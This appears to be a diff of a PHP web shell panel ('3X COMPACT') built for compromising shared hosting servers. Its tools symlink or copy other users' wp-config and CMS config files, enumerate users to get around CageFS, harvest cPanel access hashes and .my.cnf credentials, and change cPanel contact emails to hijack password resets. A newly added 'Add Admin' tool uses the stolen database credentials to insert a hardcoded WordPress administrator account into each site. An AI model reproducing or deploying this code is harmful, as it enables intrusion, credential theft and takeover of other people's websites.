@@ -4,13 +4,13 @@
 error_reporting(0);
 @ini_set('display_errors', 0);
 @ini_set('log_errors', 0);
-@ini_set('memory_limit', '-1'); // Unlimited Memory
-@set_time_limit(0); // Unlimited Time
+@ini_set('memory_limit', '-1');
+@set_time_limit(0);
 session_start();
 
 $name = "3x";
 $sexy = "default_key"; 
-$_SESSION[md5($sexy)] = "true"; // Auto-login
+$_SESSION[md5($sexy)] = "true";
 
 // --- MULTI-HOME CONFIG ---
 $home_dirs = array('/home');
@@ -18,90 +18,42 @@ for ($i = 1; $i <= 9; $i++) {
     $home_dirs[] = '/home' . $i;
 }
 
-// --- ULTIMATE FALLBACK FUNCTIONS (OPTIMIZED) ---
+// --- ULTIMATE FALLBACK FUNCTIONS ---
 
-// 1. Fallback Read
 function x_read($path) {
-    // FAST CHECK: Kalau folder induknya saja tidak ada, jangan buang waktu coba baca filenya
-    // Kecuali jika open_basedir memblokir is_dir, tapi ini trade-off untuk speed.
-    $parent = dirname($path);
-    if (!is_dir($parent) && !file_exists($parent)) return false;
-
-    // Standard Read (Tercepat)
-    if (is_readable($path)) {
-        return @file_get_contents($path);
-    }
-    
-    // PHP Native Fallbacks
-    if (function_exists('file')) {
-        $f = @file($path);
-        if ($f) return implode("", $f);
-    }
-    if (function_exists('fopen')) {
-        $h = @fopen($path, "r");
-        if ($h) {
-            $content = @fread($h, filesize($path));
-            @fclose($h);
-            if ($content) return $content;
-        }
-    }
-
-    // Shell Fallbacks (Hanya dijalankan jika file_exists tapi tidak readable, atau jika kita sangat desperate)
-    // Kita cek file_exists dulu agar tidak spam command shell yang bikin lemot
-    if (@file_exists($path)) {
-        if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
-        elseif (function_exists('exec')) { @exec("cat '$path'", $o); if($o) return implode("\n", $o); }
-        elseif (function_exists('system')) { ob_start(); @system("cat '$path'"); return ob_get_clean(); }
-        elseif (function_exists('passthru')) { ob_start(); @passthru("cat '$path'"); return ob_get_clean(); }
-    }
-    
+    if (is_readable($path)) return @file_get_contents($path);
+    if (function_exists('file')) { $f = @file($path); if ($f) return implode("", $f); }
+    if (function_exists('fopen')) { $h = @fopen($path, "r"); if ($h) { $c = @fread($h, filesize($path)); fclose($h); return $c; } }
+    if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
     return false;
 }
 
-// 2. Fallback Write
 function x_write($path, $data) {
     if (@file_put_contents($path, $data)) return true;
-    
-    if (function_exists('fopen')) {
-        $h = @fopen($path, "w");
-        if ($h) { @fwrite($h, $data); @fclose($h); return true; }
-    }
-    
-    // Shell Write
-    $data_clean = str_replace("'", "'\"'\"'", $data);
-    if (function_exists('shell_exec')) { @shell_exec("echo '$data_clean' > '$path'"); return @file_exists($path); }
-    
+    if (function_exists('fopen')) { $h = @fopen($path, "w"); if ($h) { fwrite($h, $data); fclose($h); return true; } }
+    $d = str_replace("'", "'\"'\"'", $data);
+    if (function_exists('shell_exec')) { @shell_exec("echo '$d' > '$path'"); return file_exists($path); }
     return false;
 }
 
-// 3. Fallback Symlink
 function x_link($target, $link) {
-    if (function_exists('symlink')) { @symlink($target, $link); }
-    elseif (function_exists('shell_exec')) { @shell_exec("ln -s '$target' '$link'"); }
-    elseif (function_exists('exec')) { @exec("ln -s '$target' '$link'"); }
-    elseif (function_exists('system')) { @system("ln -s '$target' '$link'"); }
+    if (function_exists('symlink')) @symlink($target, $link);
+    elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
 }
 
-// 4. Fallback HTTP
 function x_request($url) {
-    $content = false;
-    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
+    $c = false;
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout dipercepat jadi 5 detik
-        $content = curl_exec($ch);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        $c = curl_exec($ch);
         curl_close($ch);
     }
-    if (!$content && ini_get('allow_url_fopen')) {
-        $opts = ['http' => ['method' => 'GET', 'header' => "User-Agent: $ua\r\n", 'timeout' => 5]];
-        $context = stream_context_create($opts);
-        $content = @file_get_contents($url, false, $context);
-    }
-    return $content;
+    if (!$c && ini_get('allow_url_fopen')) $c = @file_get_contents($url);
+    return $c;
 }
 
 // --- TOOL LOGIC ---
@@ -116,35 +68,24 @@ function run_tool($tool) {
             
             if(!is_dir("3x_sym")) mkdir("3x_sym", 0755);
             chdir("3x_sym");
-            $ht = "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php";
-            x_write(".htaccess", $ht);
+            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
             
-            $list = ["wp-config.php", "wp/wp-config.php", "WP/wp-config.php", "config.php", "configuration.php", "sites/default/settings.php", "whm/configuration.php", "whmcs/configuration.php"];
-            
+            $list = ["wp-config.php", "config.php", "configuration.php", "sites/default/settings.php", "whm/configuration.php", "whmcs/configuration.php"];
             $count = 0;
             if(is_array($dir)){
-                foreach ($dir as $users) {
-                    $user = explode(":", $users);
-                    $u = $user[0];
+                foreach ($dir as $u_str) {
+                    $u = explode(":", $u_str)[0];
                     if(empty($u)) continue;
-
-                    // OPTIMISASI LOOP: Cek direktori user dulu
                     foreach ($home_dirs as $home) {
-                        if (!is_dir("$home/$u")) continue; // SKIP JIKA DIR TIDAK ADA
-                        
-                        foreach ($list as $confurl) {
-                            $target = "$home/$u/public_html/$confurl";
-                            // Cek eksistensi file target sebelum symlink (opsional, matikan jika ingin blind symlink)
-                            // Tapi untuk speed, blind symlink lebih cepat daripada cek file satu2.
-                            // Kita biarkan blind symlink karena ln -s itu cepat.
-                            $home_clean = str_replace('/', '', $home);
-                            x_link($target, "$u~$home_clean~" . str_replace("/", "-", $confurl) . ".txt");
+                        if (!is_dir("$home/$u")) continue;
+                        foreach ($list as $conf) {
+                            x_link("$home/$u/public_html/$conf", "$u~" . str_replace("/", "-", $conf) . ".txt");
                             $count++;
                         }
                     }
                 }
             }
-            return "<div class='msg success'>Generated $count links (Blind Mode). <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
+            return "<div class='msg success'>Symlinked $count files. <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
         }
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">RUN SYMLINKER</button></form>';
     }
@@ -152,34 +93,28 @@ function run_tool($tool) {
     // CAGEFS SYMLINKER
     if ($tool == "CageFS Symlinker") {
         if ($_POST["start"]) {
-            $passwd_path = getcwd() . "/passwd.txt";
-            $content = x_read($passwd_path);
-            if(!$content) return "<div class='msg error'>passwd.txt not found.</div>";
-            $dir = explode("\n", $content);
+            $c = x_read(getcwd() . "/passwd.txt");
+            if(!$c) return "<div class='msg error'>passwd.txt not found.</div>";
+            $dir = explode("\n", $c);
             
             if(!is_dir("3x_sym")) mkdir("3x_sym", 0755);
             chdir("3x_sym");
-            $ht = "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php";
-            x_write(".htaccess", $ht);
+            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
             
-            $list = ["wp-config.php", "wp/wp-config.php", "WP/wp-config.php", "config.php", "configuration.php", "sites/default/settings.php"];
-            
+            $list = ["wp-config.php", "config.php", "configuration.php"];
             $count = 0;
-            foreach ($dir as $users) {
-                $user = explode(":", $users);
-                $u = $user[0];
+            foreach ($dir as $u_str) {
+                $u = explode(":", $u_str)[0];
                 if(empty($u)) continue;
-
                 foreach ($home_dirs as $home) {
-                    if (!is_dir("$home/$u")) continue; // SKIP
-                    foreach ($list as $confurl) {
-                        $home_clean = str_replace('/', '', $home);
-                        x_link("$home/$u/public_html/$confurl", "$u~$home_clean~" . str_replace("/", "-", $confurl) . ".txt");
+                    if (!is_dir("$home/$u")) continue;
+                    foreach ($list as $conf) {
+                        x_link("$home/$u/public_html/$conf", "$u~" . str_replace("/", "-", $conf) . ".txt");
                         $count++;
                     }
                 }
             }
-            return "<div class='msg success'>Generated $count links. <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
+            return "<div class='msg success'>Symlinked $count files. <a href='3x_sym' target='_blank'>OPEN DIR</a></div>";
         }
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">RUN CAGEFS SYM</button></form>';
     }
@@ -187,39 +122,32 @@ function run_tool($tool) {
     // JUMPER
     if ($tool == "Jumper") {
         if (isset($_POST['scan'])) {
-            $list = ["wp-config.php", "config.php", "configuration.php", "sites/default/settings.php"];
-            $jumper_content = x_read("/etc/passwd");
-            if (!$jumper_content) return "<div class='msg error'>Err: /etc/passwd</div>";
-            $jumper = explode("\n", $jumper_content);
+            $list = ["wp-config.php", "config.php", "configuration.php"];
+            $c = x_read("/etc/passwd");
+            if (!$c) return "<div class='msg error'>Err: /etc/passwd</div>";
+            $users = explode("\n", $c);
             
             if(!is_dir("jumping")) mkdir("jumping", 0755);
             chdir("jumping");
-            $ht = "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php";
-            x_write(".htaccess", $ht);
+            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
             
             $count = 0;
-            foreach ($jumper as $jumping) {
-                $jumpfinal = explode(":", $jumping);
-                $u = $jumpfinal[0];
+            foreach ($users as $u_str) {
+                $u = explode(":", $u_str)[0];
                 if(empty($u)) continue;
-
                 foreach ($home_dirs as $home) {
-                    // SPEED HACK: Jangan cek file kalau direktori user saja tidak ada
                     if (!is_dir("$home/$u")) continue; 
-
                     foreach ($list as $url) {
-                        $dir = "$home/$u/public_html/$url";
-                        // x_read sekarang sudah dioptimalkan untuk tidak spam shell jika file tidak ada
-                        $get = x_read($dir); 
+                        $get = x_read("$home/$u/public_html/$url"); 
                         if($get) {
-                            $home_clean = str_replace('/', '', $home);
-                            x_write("$u~$home_clean~" . str_replace("/","-",$url) . ".txt", $get);
+                            $clean_home = str_replace('/', '', $home);
+                            x_write("$u~$clean_home~" . str_replace("/","-",$url) . ".txt", $get);
                             $count++;
                         }
                     }
                 }
             }
-            return "<div class='msg success'>Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
+            return "<div class='msg success'>Jumper Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
         }
         return '<form method="POST"><button type="submit" name="scan" value="1" class="btn-action">RUN JUMPER</button></form>';
     }
@@ -228,35 +156,31 @@ function run_tool($tool) {
     if ($tool == "CageFS Jumper") {
         if (isset($_POST['scan'])) {
             $list = ["wp-config.php", "config.php", "configuration.php"];
-            $jumper_content = x_read(getcwd() . "/passwd.txt");
-            if (!$jumper_content) return "<div class='msg error'>passwd.txt empty</div>";
-            $jumper = explode("\n", $jumper_content);
+            $c = x_read(getcwd() . "/passwd.txt");
+            if (!$c) return "<div class='msg error'>passwd.txt empty</div>";
+            $users = explode("\n", $c);
             
             if(!is_dir("jumping")) mkdir("jumping", 0755);
             chdir("jumping");
-            $ht = "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php";
-            x_write(".htaccess", $ht);
+            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex achon666ju5t.extremecrew\nAddType txt .php\nAddHandler txt .php");
             
             $count = 0;
-            foreach ($jumper as $jumping) {
-                $jumpfinal = explode(":", $jumping);
-                $u = $jumpfinal[0];
+            foreach ($users as $u_str) {
+                $u = explode(":", $u_str)[0];
                 if(empty($u)) continue;
                 foreach ($home_dirs as $home) {
-                    if (!is_dir("$home/$u")) continue; // SPEED HACK
-
+                    if (!is_dir("$home/$u")) continue;
                     foreach ($list as $url) {
-                        $dir = "$home/$u/public_html/$url";
-                        $get = x_read($dir);
+                        $get = x_read("$home/$u/public_html/$url");
                         if($get){
-                            $home_clean = str_replace('/', '', $home);
-                            x_write("$u~$home_clean~" . str_replace("/","-",$url) . ".txt", $get);
+                            $clean_home = str_replace('/', '', $home);
+                            x_write("$u~$clean_home~" . str_replace("/","-",$url) . ".txt", $get);
                             $count++;
                         }
                     }
                 }
             }
-            return "<div class='msg success'>Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
+            return "<div class='msg success'>CageFS Found: $count. <a href='jumping' target='_blank'>OPEN DIR</a></div>";
         }
         return '<form method="POST"><button type="submit" name="scan" value="1" class="btn-action">RUN CAGEFS JUMP</button></form>';
     }
@@ -265,24 +189,16 @@ function run_tool($tool) {
     if ($tool == "CageFS Bypasser") {
         if ($_POST["scan"]) {
             $found = "";
-            // Coba metode cepat (baca file) dulu sebelum looping posix
             $etc = x_read("/etc/passwd");
             if ($etc) {
                 $lines = explode("\n", $etc);
-                foreach($lines as $l) {
-                    $p = explode(":", $l);
-                    if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n";
-                }
+                foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; }
             } else {
-                // Fallback ke looping ID jika file tidak terbaca
                 for ($userid = 0; $userid < 2000; $userid++) {
-                    $array = posix_getpwuid($userid);
-                    if (!empty($array) && isset($array['name'])) {
-                        $found .= $array['name'] . ":\n";
-                    }
+                    $arr = posix_getpwuid($userid);
+                    if (!empty($arr) && isset($arr['name'])) $found .= $arr['name'] . ":\n";
                 }
             }
-            
             x_write("passwd.txt", $found);
             return "<div class='msg success'>Extracted. <a href='passwd.txt' target='_blank'>VIEW FILE</a></div>";
         }
@@ -292,36 +208,25 @@ function run_tool($tool) {
     // ACCESS HASH
     if ($tool == "Access Hash Finder") {
         if ($_POST["start"]) {
-            $names_content = x_read("/etc/passwd");
-            $names = explode("\n", $names_content);
-            
+            $names = explode("\n", x_read("/etc/passwd"));
             if(!is_dir("3x_hashes")) mkdir("3x_hashes", 0755);
             chdir("3x_hashes");
-            $output = "<div class='list-mini'>";
-            $count = 0;
+            $out = "<div class='list-mini'>"; $count = 0;
             if (is_array($names)) {
-                foreach ($names as $name) {
-                    $user = explode(":", $name);
-                    $u = $user[0];
-                    if(empty($u)) continue;
+                foreach ($names as $n) {
+                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                     foreach ($home_dirs as $home) {
-                        if (!is_dir("$home/$u")) continue; // SPEED HACK
-                        
-                        $folder = "$home/$u/.accesshash";
-                        $get = x_read($folder);
+                        if (!is_dir("$home/$u")) continue;
+                        $get = x_read("$home/$u/.accesshash");
                         if ($get) {
                             $count++;
-                            $get = str_replace("\n", "", $get);
-                            $home_clean = str_replace('/', '', $home);
-                            $fname = "$u~$home_clean~accesshash.txt";
-                            x_write($fname, "WHM " . $u . ":" . $get);
-                            $output .= "<div><small>FOUND:</small> <a href='3x_hashes/$fname' target='_blank'>$fname</a></div>";
+                            $fn = "$u~accesshash.txt";
+                            x_write($fn, "WHM $u:" . str_replace("\n", "", $get));
+                            $out .= "<div><small>GOT:</small> <a href='3x_hashes/$fn' target='_blank'>$fn</a></div>";
                         }
                     }
                 }
-                $output .= "</div>";
-                if ($count == 0) return "<div class='msg error'>No hashes found.</div>";
-                return $output;
+                return $out . "</div>";
             }
         }
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN HASHES</button></form>';
@@ -330,36 +235,25 @@ function run_tool($tool) {
     // CAGEFS HASH
     if ($tool == "CageFS Access Hash Finder") {
         if ($_POST["start"]) {
-            $names_content = x_read(getcwd() . "/passwd.txt");
-            $names = explode("\n", $names_content);
-            
+            $names = explode("\n", x_read(getcwd()."/passwd.txt"));
             if(!is_dir("3x_hashes")) mkdir("3x_hashes", 0755);
             chdir("3x_hashes");
-            $output = "<div class='list-mini'>";
-            $count = 0;
+            $out = "<div class='list-mini'>"; $count = 0;
             if (is_array($names)) {
-                foreach ($names as $name) {
-                    $user = explode(":", $name);
-                    $u = $user[0];
-                    if(empty($u)) continue;
+                foreach ($names as $n) {
+                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                     foreach ($home_dirs as $home) {
-                        if (!is_dir("$home/$u")) continue; // SPEED HACK
-                        
-                        $folder = "$home/$u/.accesshash";
-                        $get = x_read($folder);
+                        if (!is_dir("$home/$u")) continue;
+                        $get = x_read("$home/$u/.accesshash");
                         if ($get) {
                             $count++;
-                            $get = str_replace("\n", "", $get);
-                            $home_clean = str_replace('/', '', $home);
-                            $fname = "$u~$home_clean~accesshash.txt";
-                            x_write($fname, "WHM " . $u . ":" . $get);
-                            $output .= "<div><small>FOUND:</small> <a href='3x_hashes/$fname' target='_blank'>$fname</a></div>";
+                            $fn = "$u~accesshash.txt";
+                            x_write($fn, "WHM $u:" . str_replace("\n", "", $get));
+                            $out .= "<div><small>GOT:</small> <a href='3x_hashes/$fn' target='_blank'>$fn</a></div>";
                         }
                     }
                 }
-                $output .= "</div>";
-                if ($count == 0) return "<div class='msg error'>No hashes found.</div>";
-                return $output;
+                return $out . "</div>";
             }
         }
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CAGEFS HASH</button></form>';
@@ -368,108 +262,139 @@ function run_tool($tool) {
     // CP FINDER
     if ($tool == "Automatic CP Finder") {
         if ($_POST["start"]) {
-            $names_content = x_read("/etc/passwd");
-            $names = explode("\n", $names_content);
-            
+            $names = explode("\n", x_read("/etc/passwd"));
             if(!is_dir("3x_cps")) mkdir("3x_cps", 0755);
             chdir("3x_cps");
-            $output = "<div class='list-mini'>";
-            $count = 0;
+            $out = "<div class='list-mini'>";
             if (is_array($names)) {
-                foreach ($names as $name) {
-                    $user = explode(":", $name);
-                    $u = $user[0];
-                    if(empty($u)) continue;
+                foreach ($names as $n) {
+                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                     foreach ($home_dirs as $home) {
-                        if (!is_dir("$home/$u")) continue; // SPEED HACK
-                        
-                        $folder = "$home/$u/.my.cnf";
-                        $get = x_read($folder);
+                        if (!is_dir("$home/$u")) continue;
+                        $get = x_read("$home/$u/.my.cnf");
                         if ($get) {
-                            $count++;
-                            $home_clean = str_replace('/', '', $home);
-                            $fname = "$u~$home_clean~cpanel.txt";
-                            x_write($fname, $get);
-                            $output .= "<div><small>FOUND:</small> <a href='3x_cps/$fname' target='_blank'>$fname</a></div>";
+                            $fn = "$u~cpanel.txt";
+                            x_write($fn, $get);
+                            $out .= "<div><small>GOT:</small> <a href='3x_cps/$fn' target='_blank'>$fn</a></div>";
                         }
                     }
                 }
-                $output .= "</div>";
-                if ($count == 0) return "<div class='msg error'>No .my.cnf found.</div>";
-                return $output;
+                return $out . "</div>";
             }
         }
-        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CP CONFIG</button></form>';
+        return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CP</button></form>';
     }
 
-    // CAGEFS CP FINDER
+    // CAGEFS CP
     if ($tool == "CageFS Automatic CP Finder") {
         if ($_POST["start"]) {
-            $names_content = x_read(getcwd() . "/passwd.txt");
-            $names = explode("\n", $names_content);
-            
+            $names = explode("\n", x_read(getcwd()."/passwd.txt"));
             if(!is_dir("3x_cps")) mkdir("3x_cps", 0755);
             chdir("3x_cps");
-            $output = "<div class='list-mini'>";
-            $count = 0;
+            $out = "<div class='list-mini'>";
             if (is_array($names)) {
-                foreach ($names as $name) {
-                    $user = explode(":", $name);
-                    $u = $user[0];
-                    if(empty($u)) continue;
+                foreach ($names as $n) {
+                    $u = explode(":", $n)[0]; if(empty($u)) continue;
                     foreach ($home_dirs as $home) {
-                        if (!is_dir("$home/$u")) continue; // SPEED HACK
-                        
-                        $folder = "$home/$u/.my.cnf";
-                        $get = x_read($folder);
+                        if (!is_dir("$home/$u")) continue;
+                        $get = x_read("$home/$u/.my.cnf");
                         if ($get) {
-                            $count++;
-                            $home_clean = str_replace('/', '', $home);
-                            $fname = "$u~$home_clean~cpanel.txt";
-                            x_write($fname, $get);
-                            $output .= "<div><small>FOUND:</small> <a href='3x_cps/$fname' target='_blank'>$fname</a></div>";
+                            $fn = "$u~cpanel.txt";
+                            x_write($fn, $get);
+                            $out .= "<div><small>GOT:</small> <a href='3x_cps/$fn' target='_blank'>$fn</a></div>";
                         }
                     }
                 }
-                $output .= "</div>";
-                if ($count == 0) return "<div class='msg error'>No .my.cnf found.</div>";
-                return $output;
+                return $out . "</div>";
             }
         }
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CAGEFS CP</button></form>';
     }
 
-    // CONTACT EMAIL
-    if ($tool == "Contactemail Changer") {
-        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') ? 'https://' : 'http://';
-        $port = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') ? ':2083' : ':2082';
-        $mainurl = $protocol . $_SERVER['HTTP_HOST'] . $port;
-        
-        $server_check = x_request($mainurl);
-        if ($server_check && preg_match("/Reset Password/", $server_check)) {
-            if ($_POST['go']) {
-                $user = get_current_user();
-                $path = "";
-                foreach($home_dirs as $home) {
-                    if (is_dir("$home/$user")) {
-                        $path = "$home/$user/";
-                        break;
-                    }
+    // ADD ADMIN FEATURE (FIXED)
+    if ($tool == "Add Admin") {
+        if ($_POST["start"]) {
+            $path = $_POST['path'];
+            if(substr($path, -1) != '/') $path .= '/';
+            if (!is_dir($path)) return "<div class='msg error'>Directory invalid: ".htmlspecialchars($path)."</div>";
+            
+            $files = scandir($path);
+            $out = "<div class='list-mini'>";
+            $success = 0; $fail = 0;
+            
+            foreach($files as $file) {
+                if($file == '.' || $file == '..') continue;
+                $full = $path . $file;
+                if(is_dir($full)) continue;
+                
+                $content = x_read($full);
+                if(!$content) { $fail++; continue; }
+
+                // Improved Regex
+                if (!preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_host)) continue;
+                if (!preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_name)) continue;
+                if (!preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_user)) continue;
+                if (!preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/i", $content, $m_pass)) $m_pass[1] = "";
+                
+                $host = $m_host[1]; $user = $m_user[1]; $pass = $m_pass[1]; $db = $m_name[1];
+                
+                // Get prefix
+                if (preg_match("/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m_pre)) $pre = $m_pre[1]; else $pre = "wp_";
+
+                // Connect logic
+                $con = @mysqli_connect($host, $user, $pass, $db);
+                // Fallback: If localhost fails, try 127.0.0.1
+                if (!$con && ($host == 'localhost')) {
+                    $con = @mysqli_connect('127.0.0.1', $user, $pass, $db);
                 }
-                if ($path) {
-                    chdir($path . ".cpanel");
-                    @unlink("contactinfo");
-                    chdir("..");
-                    @unlink(".contactemail");
-                    // Gunakan fallback write
-                    x_write(".contactemail", $_POST['mail']);
-                    return "<div class='msg success'>Email changed! <a href='$mainurl/resetpass' target='_blank'>Reset Password</a></div>";
+
+                if (!$con) {
+                    $out .= "<div style='color:#555'>$file: <span style='color:red'>DB Conn Fail</span></div>";
+                    continue; 
+                }
+
+                $url_q = mysqli_query($con, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
+                if(!$url_q || mysqli_num_rows($url_q) == 0) {
+                    $out .= "<div style='color:#555'>$file: <span style='color:orange'>No SiteURL</span></div>";
+                    continue;
+                }
+
+                $site = mysqli_fetch_assoc($url_q)['option_value'];
+                $u_login = "xshikata"; $u_pass = md5("@04Dec97");
+                
+                $chk = mysqli_query($con, "SELECT ID FROM {$pre}users WHERE user_login='$u_login'");
+                if(mysqli_num_rows($chk) == 0) {
+                    $ins = mysqli_query($con, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$u_login', '$u_pass', '$u_login', 'x@x.com', NOW(), 0, '$u_login')");
+                    if($ins){
+                        $id = mysqli_insert_id($con);
+                        mysqli_query($con, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
+                        mysqli_query($con, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pre}user_level', '10')");
+                        $out .= "<div><small style='color:#2ecc71'>[OK]</small> <a href='$site/wp-login.php' target='_blank'>$site</a></div>";
+                        $success++;
+                    } else {
+                        $out .= "<div style='color:#555'>$file: <span style='color:red'>Insert Fail</span></div>";
+                    }
+                } else {
+                    $out .= "<div style='color:#555'>$file: <span style='color:yellow'>Exists</span></div>";
                 }
             }
-            return '<form method="post"><input type="text" name="mail" class="mini-input" placeholder="New Email..." /><button type="submit" name="go" value="GO" class="btn-action">CHANGE</button></form>';
-        } else {
-            return "<div class='msg error'>CPanel locked/not resetable.</div>";
+            return $out . "</div><div class='msg success'>Result: $success Injected.</div>";
         }
+        return '<form method="POST"><input type="text" name="path" class="mini-input" value="'.getcwd().'/jumping" placeholder="Path to Configs"><button type="submit" name="start" value="1" class="btn-action">INJECT ADMIN</button></form>';
+    }
+
+    // EMAIL CHANGE
+    if ($tool == "Contactemail Changer") {
+        if ($_POST['go']) {
+            $u = get_current_user();
+            foreach($home_dirs as $home) { if(is_dir("$home/$u")) { $p = "$home/$u/"; break; } }
+            if(isset($p)) {
+                chdir($p.".cpanel"); @unlink("contactinfo"); chdir(".."); @unlink(".contactemail");
+                x_write(".contactemail", $_POST['mail']);
+                return "<div class='msg success'>Changed! Try Reset Password.</div>";
+            }
+        }
+        return '<form method="post"><input type="text" name="mail" class="mini-input" placeholder="Email"><button type="submit" name="go" value="1" class="btn-action">CHANGE</button></form>';
     }
     return "";
 }
@@ -482,128 +407,59 @@ $current_tool = isset($_GET["tool"]) ? $_GET["tool"] : "";
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>3X COMPACT</title>
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg: #050505;
-            --card-bg: #101010;
-            --border: #222;
-            --accent: #eee;
-            --text: #888;
-            --success: #2ecc71;
-            --error: #e74c3c;
-        }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background: var(--bg); color: var(--text); font-family: 'Roboto Mono', monospace; font-size: 11px; padding: 10px; display: flex; justify-content: center; }
-        .wrap { width: 100%; max-width: 800px; }
-        
-        /* Header */
-        header { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid var(--border); margin-bottom: 15px; }
-        h1 { color: #fff; font-size: 14px; letter-spacing: 1px; }
-        .meta { display: flex; gap: 10px; }
-        .tag { background: var(--card-bg); padding: 3px 6px; border-radius: 3px; border: 1px solid var(--border); font-size: 10px; color: #555; }
-        .tag i { color: #fff; margin-right: 3px; }
-
-        /* Compact Grid */
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; margin-bottom: 20px; }
-        
-        .card {
-            background: var(--card-bg); border: 1px solid var(--border); color: #666;
-            padding: 10px 5px; text-align: center; cursor: pointer; text-decoration: none;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            border-radius: 4px; transition: 0.2s; height: 70px;
-        }
-        .card:hover, .card.active { border-color: #444; color: #fff; background: #151515; }
-        .card i { font-size: 18px; margin-bottom: 5px; color: #444; }
-        .card:hover i, .card.active i { color: #fff; }
-        .card span { font-size: 10px; font-weight: 600; }
-
-        /* Console Area */
-        .console { background: var(--card-bg); border: 1px solid var(--border); padding: 15px; border-radius: 4px; }
-        .console-head { border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 10px; font-weight: bold; color: #fff; font-size: 12px; }
-
-        /* Elements */
-        .btn-action {
-            background: #fff; color: #000; border: none; width: 100%; padding: 8px; 
-            font-family: inherit; font-weight: bold; font-size: 11px; cursor: pointer; border-radius: 3px;
-        }
-        .btn-action:hover { background: #ccc; }
-        
-        .mini-input {
-            width: 100%; background: #000; border: 1px solid var(--border); padding: 8px;
-            color: #fff; margin-bottom: 8px; font-family: inherit; font-size: 11px;
-        }
-        .mini-input:focus { border-color: #555; outline: none; }
-
-        .msg { padding: 10px; margin-top: 5px; border-radius: 3px; font-size: 11px; }
-        .msg.success { background: rgba(46, 204, 113, 0.1); color: var(--success); border: 1px solid rgba(46, 204, 113, 0.2); }
-        .msg.error { background: rgba(231, 76, 60, 0.1); color: var(--error); border: 1px solid rgba(231, 76, 60, 0.2); }
-        .msg a { color: inherit; text-decoration: underline; font-weight: bold; }
-
-        .list-mini { display: flex; flex-direction: column; gap: 4px; max-height: 250px; overflow-y: auto; }
